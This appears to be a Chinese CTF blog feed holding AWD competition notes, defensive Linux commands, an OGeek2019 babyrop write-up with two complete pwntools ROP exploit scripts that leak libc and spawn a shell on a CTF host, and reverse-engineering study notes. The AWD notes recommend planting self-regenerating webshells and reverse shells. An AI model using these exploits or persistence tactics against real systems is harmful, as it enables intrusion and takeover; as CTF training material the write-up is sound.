    <content type="html"><![CDATA[<h2 id="探测主机"><a href="#探测主机" class="headerlink" title="探测主机"></a>探测主机</h2><p>Nmap或HTTPScan</p><p>Nmap扫描端口</p><h2 id="端口攻击"><a href="#端口攻击" class="headerlink" title="端口攻击"></a>端口攻击</h2><p>常见：22，2389，1443，3306</p><p>==准备爆破脚本！！！==</p><h2 id="WEB攻击"><a href="#WEB攻击" class="headerlink" title="WEB攻击"></a>WEB攻击</h2><blockquote><p>Web 方面的语言多为 PHP，小部分为 Java 和 Python。这里的 Web 环境分两种情况，一种是已有漏洞的框架，一种是出题人写的框架。</p><p>如果是已有漏洞的框架，通常会比较明显。比如说 Struts 2 各种漏洞等等，用工具扫就可以扫出来。这个需要准备得比较充分，在电脑中备好 EXP 库、漏洞库和各种扫描工具库，以便能够快速利用比较明显的漏洞。总之手要快！</p><p>如果是出题人出的框架，常用并且简单有效的做法是把整站源码下载下来，直接用工具审计。以 PHP 举例，一般的流程是先D盾查杀，发现有带有预留后门或者 Webshell 马上报给防守队友进行加固。</p><p>把后门的问题搞定、防止别人快速拿分后，其次才是源码审计，发现问题点后迅速验证，报给防守队友，并且开始写攻击脚本。以 PHP 举例，一般是使用 Seay 等源码审计工具，审核出比较明显的漏洞。</p><p>完成了工具扫描后，开始常规的渗透测试，比如说文件上传、SQL 注入等等，看是否能绕过，找到一个点马上写利用脚本。<br>————————————————<br>版权声明：本文为CSDN博主「neversec」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/github_35912913/article/details/89336506">https://blog.csdn.net/github_35912913/article/details/89336506</a></p></blockquote><h2 id="维持权限"><a href="#维持权限" class="headerlink" title="维持权限"></a>维持权限</h2><p>AWD优先种不死马，反弹shell</p><blockquote><p>不死马：不断在该路径生成shell，用于工具连接</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -name <span class="hljs-number">*f</span>lag*<br>grep -rn <span class="hljs-string">&quot;flag&quot;</span> *<br></code></pre></td></tr></table></figure><h2 id="防守"><a href="#防守" class="headerlink" title="防守"></a>防守</h2><ul><li><p>备份源码和数据库</p></li><li><p>系统安全性检查。关闭3306！！、限制ssh登录，修改ssh密码，Mysql是否默认密码==写脚本刷!==</p></li><li><p>部署WAF@zx</p></li><li><p>修改权限。修改Mysql权限等。</p></li><li><blockquote><p>监控可读写权限的目录是否新增、删除文件并及时提醒。这里说下，如果被种了不死马的话通常有以下几种克制方法。</p><ul><li><p>强行 kill 掉进程后重启服务</p></li><li><p>建立一个和不死马相同名字的文件或者目录</p></li><li><p>写脚本不断删除文件</p></li><li><p>不断写入一个和不死马同名的文件</p></li></ul><ol start="6"><li>部署流量监控脚本或开启服务器日志记录。目的主要是为了进行流量回放，看其它大佬如何用我们没发现的漏洞来打我们的机子，抓取到之后把看不懂的流量直接回放到别的机子去，这里还得提到，我们自己在攻击的时候，也要试着混淆一下自己的攻击流量，不能轻易被别人利用。<br>————————————————<br>版权声明：本文为CSDN博主「neversec」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/github_35912913/article/details/89336506">https://blog.csdn.net/github_35912913/article/details/89336506</a></li></ol></blockquote></li><li><p>流量监控脚本</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.服务器所需要的软件包，避免服务器上没有</p><p>2.EXP和漏洞库</p><p>3.加固、基线检查漏洞</p><p>4.WAF代码和部署脚本</p><p>5.批量拿shell、提交flag、维持权限的代码或小框架</p><p><strong>软件包也得看给你的服务器有无足够的权限去运行</strong></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>AWD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>AWD常用指令</title>
    <link href="/2020/01/13/AWD%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <url>/2020/01/13/AWD%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>备份web目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">tar -zcvf web.tar.gz <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span><br></code></pre></td></tr></table></figure><p>查看已建立网络连接和对应进程</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">netstat -antulp <span class="hljs-string">| grep EST</span><br></code></pre></td></tr></table></figure><p>用户管理</p><p>w    查看当前用户</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">pkill -kill -t <span class="hljs-tag">&lt;<span class="hljs-name">Username</span>&gt;</span><br></code></pre></td></tr></table></figure><p>查看指定端口被哪个进程占用</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">lsof -i:端口号 或者 netstat -tunlp<span class="hljs-string">|grep 端口号</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#备份mysql数据库<br>mysqldump -u 用户名 -<span class="hljs-selector-tag">p</span> 密码 数据库名 &gt; back<span class="hljs-selector-class">.sql</span>　　　　<br>mysqldump --all-databases &gt; bak<span class="hljs-selector-class">.sql</span>　　　　　　<br>#还原mysql数据库<br>mysql -u 用户名 -<span class="hljs-selector-tag">p</span> 密码 数据库名 &lt; bak<span class="hljs-selector-class">.sql</span>　　<br>find / *<span class="hljs-selector-class">.php</span> -perm  　　 　　<br>awk -F:  /etc/passwd　　　　<br>crontab -l　　　<br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs #结束进程命令">#检测所有的tcp连接数量及状态<br>netstat -ant|awk  |grep |sed -e  -e |sort|uniq -c|sort -rn<br>#查看页面访问排名前十的IP<br>cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log | cut -f1 -d   | sort | uniq -c | sort -k  -r | head -　　<br>#查看页面访问排名前十的URL<br>cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log | cut -f4 -d   | sort | uniq -c | sort -k  -r | head -<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">#封杀某个IP或者ip段，如：.　　<br>iptables -<span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">INPUT</span> -s . -j DROP<br>iptables -<span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">INPUT</span> -s ./ -j DROP<br>#禁止从某个主机ssh远程访问登陆到本机，如<span class="hljs-number">123</span>..　　<br>iptable -t <span class="hljs-attribute">filter</span> -<span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">INPUT</span> -s . -<span class="hljs-selector-tag">p</span> tcp --dport  -j DROP　　<br></code></pre></td></tr></table></figure><p><strong>封杀ip一旦发现直接取消比赛资格的，转发流量也是</strong></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>AWD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OGeek2019-babyrop</title>
    <link href="/2020/01/13/OGeek2019-babyrop/"/>
    <url>/2020/01/13/OGeek2019-babyrop/</url>
    
    <content type="html"><![CDATA[<img src="/2020/01/13/OGeek2019-babyrop/image-20200109113815190.png" class="" title="image-20200109113815190"><h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><img src="/2020/01/13/OGeek2019-babyrop/image-20200109113247829.png" class="" title="image-20200109113247829"><img src="/2020/01/13/OGeek2019-babyrop/image-20200109113307666.png" class="" title="image-20200109113307666"><p>为了绕过strncmp，我们在v6这里可以放一个\x00 因为strlen会在识别到\x00之后停止，这样strncmp就会默认返回0</p><img src="/2020/01/13/OGeek2019-babyrop/image-20200109113459963.png" class="" title="image-20200109113459963"><p>这里的v5返回值又跟下面的a1是一致的</p><img src="/2020/01/13/OGeek2019-babyrop/image-20200109113326191.png" class="" title="image-20200109113326191"><img src="/2020/01/13/OGeek2019-babyrop/image-20200109113733376.png" class="" title="image-20200109113733376"><p>这里也没有啥可以调用的</p><p>那就是rop，leak libc了</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><h3 id="leak-libc版"><a href="#leak-libc版" class="headerlink" title="leak libc版"></a>leak libc版</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2.7</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;[OGeek2019]babyrop&#x27;</span>)<br>lib = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./[OGeek2019]babyrop&#x27;</span>)<br>        lib = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        lib = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>    main_start = <span class="hljs-number">0x8048825</span><br>    write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    pop_ret = <span class="hljs-number">0x80488F9</span><br>    libc = elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>    payload = <span class="hljs-string">&quot;\x00&quot;</span><br>    payload += <span class="hljs-string">&quot;\xff&quot;</span> * <span class="hljs-number">7</span><br>    sh.sendline(payload)<br>    <br>    sh.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>    payload = cyclic(<span class="hljs-number">0xE7</span> + <span class="hljs-number">0x4</span>)<br>    payload += p32(write_plt)<br>    payload += p32(pop_ret)<br>    payload += p32(<span class="hljs-number">1</span>)<br>    payload += p32(libc)<br>    payload += p32(<span class="hljs-number">4</span>)<br>    payload += p32(main_start)<br>    sh.sendline(payload)<br><br>    __libc_start_main = u32(sh.recv(<span class="hljs-number">4</span>))<br>    libc = __libc_start_main - lib.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>    system = libc + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    binsh = libc + lib.search(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>).<span class="hljs-built_in">next</span>()<br><br>    log.success(<span class="hljs-string">&quot;libc: &quot;</span> + <span class="hljs-built_in">hex</span>(libc))<br>    log.success(<span class="hljs-string">&quot;system: &quot;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&quot;binsh: &quot;</span> + <span class="hljs-built_in">hex</span>(binsh))<br><br>    payload = <span class="hljs-string">&quot;\x00&quot;</span><br>    payload += <span class="hljs-string">&quot;\xff&quot;</span> * <span class="hljs-number">7</span><br>    sh.sendline(payload)<br>    <br>    sh.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>    payload = cyclic(<span class="hljs-number">0xE7</span> + <span class="hljs-number">0x4</span>)<br>    payload += p32(system)<br>    payload += p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload += p32(binsh)<br>    sh.sendline(payload)<br>    sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29257</span>,<span class="hljs-number">0</span> )<br></code></pre></td></tr></table></figure><h3 id="leak-write"><a href="#leak-write" class="headerlink" title="leak write"></a>leak write</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2.7</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;[OGeek2019]babyrop&#x27;</span>)<br>lib = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./[OGeek2019]babyrop&#x27;</span>)<br>        lib = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        lib = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>    main_start = <span class="hljs-number">0x8048825</span><br>    write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    pop_ret = <span class="hljs-number">0x80488F9</span><br><br>    payload = <span class="hljs-string">&quot;\x00&quot;</span><br>    payload += <span class="hljs-string">&quot;\xff&quot;</span> * <span class="hljs-number">7</span><br>    sh.sendline(payload)<br>    <br>    sh.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>    payload = cyclic(<span class="hljs-number">0xE7</span> + <span class="hljs-number">0x4</span>)<br>    payload += p32(write_plt)<br>    payload += p32(pop_ret)<br>    payload += p32(<span class="hljs-number">1</span>)<br>    payload += p32(write_got)<br>    payload += p32(<span class="hljs-number">4</span>)<br>    payload += p32(main_start)<br>    sh.sendline(payload)<br><br>    write_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br>    libc = write_addr - lib.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    system = libc + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    binsh = libc + lib.search(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>).<span class="hljs-built_in">next</span>()<br><br>    log.success(<span class="hljs-string">&quot;libc: &quot;</span> + <span class="hljs-built_in">hex</span>(libc))<br>    log.success(<span class="hljs-string">&quot;system: &quot;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&quot;binsh: &quot;</span> + <span class="hljs-built_in">hex</span>(binsh))<br><br>    payload = <span class="hljs-string">&quot;\x00&quot;</span><br>    payload += <span class="hljs-string">&quot;\xff&quot;</span> * <span class="hljs-number">7</span><br>    sh.sendline(payload)<br>    <br>    sh.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>    payload = cyclic(<span class="hljs-number">0xE7</span> + <span class="hljs-number">0x4</span>)<br>    payload += p32(system)<br>    payload += p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload += p32(binsh)<br>    sh.sendline(payload)<br>    sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29257</span>,<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure><h2 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h2><h2 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br> <span class="hljs-keyword">char</span> a[] = &#123;<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>&#125;;<br>   <span class="hljs-keyword">char</span> b[] = &#123;<span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>&#125;;<br>   <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">10</span>];<br>  <span class="hljs-built_in">sprintf</span>(buffer, <span class="hljs-string">&quot;%.4s%.4s&quot;</span>, a, b);<br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buffer);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><img src="/2020/01/13/OGeek2019-babyrop/SouthEast.png" class="" title="img"><p>将ab写入buffer</p><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><p>ssize_t read (int fd, void *buf, size_t count);<br>read(a,buf,c)<br>打开文件a，读取c个字节，存到buf中<br>返回实际读到的字节数。如果出错 返回-1</p><p>read(0,&amp;buf,4u)</p><p>从shell读取4u到buf中</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>19/9/20笔记</title>
    <link href="/2019/11/29/19920%E7%AC%94%E8%AE%B0/"/>
    <url>/2019/11/29/19920%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="逆向笔记"><a href="#逆向笔记" class="headerlink" title="逆向笔记"></a>逆向笔记</h1><p>PE是windows下的文件，ELF是linux/unix下的文件</p><p>packer壳</p><p>28537194573619560LL LL-&gt;长长整型</p><p>可在汇编语言中寻找到mov rax ，指针 沿着指针 再按R看转换后的内容（由于低尾端，栈地址向低地址扩展，所以要将字符串反过来）</p><h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><p>b 函数名</p><blockquote><p>下断点breakpoint</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">&gt;<span class="hljs-keyword">b </span>__libc_start_main <span class="hljs-comment">#在主函数设置断点</span><br></code></pre></td></tr></table></figure></blockquote><p>set</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> <span class="hljs-variable">$eip</span>=地址 #跳转到某函数地址<br><span class="hljs-builtin-name">set</span> <span class="hljs-variable">$eip</span>=0x0804849b<br></code></pre></td></tr></table></figure><p>r</p><blockquote><p>run 运行到我们下断点的地方，停止</p></blockquote><p>n</p><blockquote><p>运行一步</p></blockquote><p>x/200wx $寄存器</p><blockquote><p>x:就是用来查看内存中数值的，后面的200代表查看多少个，wx代表是以word字节查看看，$eax代表的eax寄存器中的值</p></blockquote><h2 id="反编译pyc"><a href="#反编译pyc" class="headerlink" title="反编译pyc"></a>反编译pyc</h2><blockquote><p>uncompyle2 -h</p></blockquote><p>==md5(md5($pass)) ：第一次加密后，结果转换成小写，对结果再加密一次.解密为：解密一次后，再解密一次==</p><img src="/2019/11/29/19920%E7%AC%94%E8%AE%B0/image-20190820013756861.png" class="" title="image-20190820013756861"><blockquote><p>Re2-cpp-is-awesome</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> ( a1 != <span class="hljs-number">2</span> )<br>  &#123;<br>    v3 = *a2;<br>    v4 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">&quot;Usage: &quot;</span>, a3);<br>    v6 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(v4, v3, v5);<br>    std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(v6, <span class="hljs-string">&quot; flag\n&quot;</span>, v7);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;                                             <span class="hljs-comment">// 检测输入</span><br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v13, a2, a3);<br>  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">basic_string</span>(&amp;v12, a2[<span class="hljs-number">1</span>], &amp;v13);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v13);<br>  v15 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">begin</span>(&amp;v12); ; <span class="hljs-built_in">iplusplus</span>(&amp;i) )<br>  &#123;<br>    v14 = std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">end</span>(&amp;v12);<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">iNotEqualV14</span>((__int64)&amp;i, (__int64)&amp;v14) )<br>      <span class="hljs-keyword">break</span>;<br>    v9 = *(<span class="hljs-keyword">unsigned</span> __int8 *)<span class="hljs-built_in">thesame</span>((__int64)&amp;i);<br>    <span class="hljs-keyword">if</span> ( (_BYTE)v9 != originalKey[Number[v15]] )<span class="hljs-comment">//key</span><br>      <span class="hljs-built_in">betterLuckNextTime</span>((__int64)&amp;i, (__int64)&amp;v14, v9);<br>    ++v15;<br>  &#125;<br>  <span class="hljs-built_in">coutShouldHaveFlagNow</span>((__int64)&amp;i, (__int64)&amp;v14, v8);<br>  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::~<span class="hljs-built_in">basic_string</span>(&amp;v12);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">key = <span class="hljs-string">&#x27;L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_&#123;FL4G&#125;_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t&#x27;</span><br>dump = [<span class="hljs-number">0x24</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x2D</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x2D</span>,<span class="hljs-number">0x16</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x29</span><br>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x2B</span>]<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dump:<br>    flag +=key[i]<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><img src="/2019/11/29/19920%E7%AC%94%E8%AE%B0/image-20190820143248918.png" class="" title="image-20190820143248918"><p>记得全都要写下来，包括0</p><hr><img src="/2019/11/29/19920%E7%AC%94%E8%AE%B0/image-20190821163335042.png" class="" title="image-20190821163335042"><p>不止可能是保存，还有可能读取文本中的字符串与程序里的对比</p><hr><p>IDA </p><p>快捷键Y 输入 char a[0x大小] 就可以自动转成字符串</p><p>汇编的条件跳转指令:</p><p>​      jmp :无条件跳转 (jump)</p><p>​      je/jz :结果为0跳转 (jump zero)</p><p>​      jnz/jne: 结果不为0跳转 (jump not zero)</p><p>​      js:结果为负跳转 (Jump if sign)</p><p>​      jns:结果为正跳转(Jump if not sign)</p><p>​      jb:小于则跳转（Jump below）</p><p>​     